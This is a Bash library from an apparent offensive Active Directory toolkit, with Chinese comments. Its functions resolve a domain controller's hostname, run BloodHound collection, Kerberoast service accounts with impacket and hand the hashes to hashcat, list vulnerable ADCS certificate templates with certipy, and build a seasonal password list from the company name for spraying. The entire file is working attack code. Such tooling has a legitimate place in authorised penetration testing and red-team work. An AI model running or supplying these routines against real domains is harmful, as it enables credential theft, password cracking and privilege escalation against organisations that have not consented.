# recon.sh — AD 侦察共享函数:DC FQDN 解析 / 有凭据深度情报 / 公司词根与季节口令
# 用法: source .../lib/recon.sh(自动带上 common.sh)
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"

# dc_fqdn <DC IP> <域> <用户> <密码> [代理前缀] — 回显 DC 的 FQDN
# 取 nxc smb 的 name: 字段拼域名;主机名为空时退回 DC IP,避免拼出 ".domain" 这种废 FQDN
dc_fqdn() {
    local dcip="$1" domain="$2" u="$3" p="$4" proxy="${5:-}" host
    host=$($proxy nxc smb "$dcip" -u "$u" -p "$p" -d "$domain" 2>/dev/null | grep -oP 'name:\S+' | head -1 | sed 's/name://')
    [ -n "$host" ] && echo "$host.$domain" || echo "$dcip"
}

# intel_collect <DC IP> <域> <用户> <密码> <输出目录> <kerb文件> [代理前缀]
# 有凭据后的深度情报三件套:BloodHound(-c All --zip) / Kerberoast(GetUserSPNs -request) / ADCS(certipy find -vulnerable)
# 完成后设置全局变量:DC_FQDN / BH(zip 路径,可能空) / KC(krb5tgs 计数)
intel_collect() {
    local dcip="$1" domain="$2" u="$3" p="$4" outdir="$5" kerbfile="$6" proxy="${7:-}"
    DC_FQDN=$(dc_fqdn "$dcip" "$domain" "$u" "$p" "$proxy")

    go "BH 采集($u)..."
    $proxy bloodhound-python -u "$u" -p "$p" -d "$domain" -dc "$DC_FQDN" -ns "$dcip" -c All --zip -o "$outdir" 2>&1 | tail -2
    BH=$(ls "$outdir"/*bloodhound*.zip 2>/dev/null | tail -1)
    [ -n "$BH" ] && ok "BH 数据: $BH → 导入 http://127.0.0.1:8080"

    go "Kerberoast..."
    $proxy impacket-GetUserSPNs "$domain/$u:$p" -dc-ip "$dcip" -request -outputfile "$kerbfile" 2>&1 | grep -E 'MSSQL|HTTP|CIFS|Found' | head -3
    KC=$(grep krb5tgs "$kerbfile" 2>/dev/null | wc -l)
    [ "$KC" -gt 0 ] && ok "Kerberoast $KC 个 → hashcat -m 13100"

    go "ADCS..."
    $proxy certipy find -u "$u@$domain" -p "$p" -dc-ip "$dcip" -vulnerable -text -output "$outdir/adcs" 2>&1 | grep -E 'ESC|Found.*CA' | head -3
}

# company_root <域FQDN> — 回显公司词根(test.local → Test)
company_root() { echo "$1" | cut -d. -f1 | sed 's/^./\U&/'; }

# seasonal_passwords <公司词根> <输出目录> — 公司词根 × 年季 × 常见后缀 → <输出目录>/passlist.txt
seasonal_passwords() {
    python3 - "$1" "$2" <<'PY'
import sys, itertools
from datetime import datetime
company, out = sys.argv[1], sys.argv[2]
roots = [company, company.upper(), company.capitalize()]
seasons = ["Spring", "Summer", "Autumn", "Fall", "Winter", ""]
y0 = datetime.now().year                       # 动态年份:今年前后几年
yrs = list(range(y0 - 4, y0 + 2))
years = [str(y) for y in yrs] + [str(y)[2:] for y in yrs]
suffixes = ["!", "@", "#", "1!", "@123", "!!", "$", f"{y0}!", ""]
pw = set()
for r, s, y, suf in itertools.product(roots, seasons, years, suffixes):
    cand = f"{r}{s}{y}{suf}"
    if len(cand) >= 8: pw.add(cand)
for r in roots:                                  # 裸词根 + 数字
    for suf in ["123", "1234", "123456", "@123", "!@#", str(y0), "Admin1"]:
        pw.add(f"{r}{suf}")
with open(f"{out}/passlist.txt", "w") as f:
    f.write("\n".join(sorted(pw)) + "\n")
print(f"  passlist.txt: {len(pw)} 条变体")
PY
}
